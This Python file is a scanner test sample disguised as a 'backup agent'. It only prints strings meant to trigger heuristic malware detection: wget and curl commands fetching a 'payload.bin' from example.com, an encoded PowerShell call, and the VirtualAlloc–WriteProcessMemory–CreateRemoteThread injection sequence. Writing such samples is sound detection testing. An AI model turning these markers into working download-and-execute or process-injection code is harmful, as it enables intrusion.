"""
suspicious_backup_agent.py
Harmless scanner test sample.

Purpose:
- Trigger combination-rule based heuristic detection.
- Does not execute commands.
- Does not download files.
- Does not inject memory.
"""

import json
import time


class BackupAgent:
    def __init__(self):
        self.config = {
            "mode": "dry_run",
            "remote_server": "example.com",
            "tools": {
                "shell": "powershell",
                "encoding": "base64",
                "download_1": "wget",
                "download_2": "curl",
            },
            "windows_api_markers": [
                "virtualalloc",
                "writeprocessmemory",
                "createremotethread",
            ],
        }

    def load_task_profile(self):
        profile = {
            "task": "sync_user_backup",
            "method": "subprocess",
            "network": "socket",
            "post_action": "exec(",
            "command_api": "os.system",
        }
        return profile

    def simulate_update_check(self):
        """
        This only simulates suspicious behavior for scanner testing.
        No command is actually executed.
        """
        fake_commands = [
            "os.system('wget http://example.com/payload.bin')",
            "subprocess.run(['curl', 'http://example.com/update'])",
            "powershell -enc base64",
        ]

        for cmd in fake_commands:
            print("[DRY RUN] Would inspect command:", cmd)

    def simulate_memory_behavior(self):
        """
        These are only text markers for heuristic scanning.
        """
        api_sequence = [
            "virtualalloc",
            "writeprocessmemory",
            "createremotethread",
        ]

        print("[DRY RUN] Windows API sequence:", " -> ".join(api_sequence))

    def run(self):
        print("[*] BackupAgent started in safe dry-run mode")
        print("[*] Loaded config:")
        print(json.dumps(self.config, indent=2))

        profile = self.load_task_profile()
        print("[*] Loaded task profile:")
        print(json.dumps(profile, indent=2))

        self.simulate_update_check()
        self.simulate_memory_behavior()

        time.sleep(1)
        print("[*] Finished scanner test sample")


if __name__ == "__main__":
    agent = BackupAgent()
    agent.run()